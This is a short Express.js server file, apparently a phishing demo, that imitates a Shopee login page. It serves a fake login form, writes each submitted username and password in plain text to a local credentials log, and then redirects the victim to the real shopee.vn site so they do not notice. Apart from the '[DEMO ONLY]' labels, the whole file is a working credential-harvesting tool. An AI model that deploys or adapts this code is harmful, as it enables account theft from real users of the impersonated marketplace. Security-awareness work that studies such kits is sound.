const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "views")));

app.get("/buyer/login", (req, res) => {
  const html = fs.readFileSync(path.join(__dirname, "views/fakelogin.html"), "utf8");
  res.send(html);
});

app.post("/login", (req, res) => {
  const { loginKey, password } = req.body;

  const logEntry = `
[DEMO ONLY]
Username: ${loginKey}
Password: ${password}
Time: ${new Date().toISOString()}
---------------------------
`;

  fs.appendFileSync("credentials.log", logEntry);

  // Redirect to "legitimate" homepage
  res.redirect("https://shopee.vn/");
});

app.get("/homepage", (req, res) => {
  res.sendFile(path.join(__dirname, "views/homepage.html"));
});

app.listen(3000, () => {
  console.log("Demo phishing server running on http://localhost:3000");
});